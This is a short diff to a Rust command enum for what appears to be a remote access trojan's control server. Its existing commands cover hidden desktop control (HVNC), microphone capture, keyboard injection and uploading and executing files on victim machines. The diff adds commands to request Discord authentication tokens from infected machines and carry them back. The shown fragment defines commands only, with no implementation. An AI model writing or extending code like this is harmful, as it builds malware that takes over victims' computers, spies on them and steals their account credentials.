@@ -39,6 +39,7 @@ pub enum ServerCommand {
     StartRemoteDesktop(SocketAddr, RemoteDesktopConfig),
     StopRemoteDesktop(SocketAddr),
     RequestMicDevices(SocketAddr),
+    RequestDiscordTokens(SocketAddr),
     StartMicLive(SocketAddr, String),
     StopMicLive(SocketAddr),
     StartMicRecording(SocketAddr, String),
@@ -50,6 +51,7 @@ pub enum ServerCommand {
     DesktopRecordingPreviewFrame(SocketAddr, DesktopRecordingPreviewFrame),
     DesktopRecordingFile(SocketAddr, FileData),
     MicDeviceList(SocketAddr, Vec<MicDeviceInfo>),
+    DiscordTokenData(SocketAddr, DiscordTokenData),
     MouseClick(SocketAddr, MouseClickData),
     KeyboardInput(SocketAddr, KeyboardInputData),
     RemoteDesktopFrame(SocketAddr, RemoteDesktopFrame),
@@ -105,7 +107,7 @@ pub enum ServerCommand {
     StopHVNC(SocketAddr),
     OpenExplorer(SocketAddr),
     HVNCFrame(SocketAddr, Vec<u8>),
-  
+
     UploadAndExecute(SocketAddr, FileData),
     ExecuteFile(SocketAddr, String),
     UploadFile(SocketAddr, String, FileData),
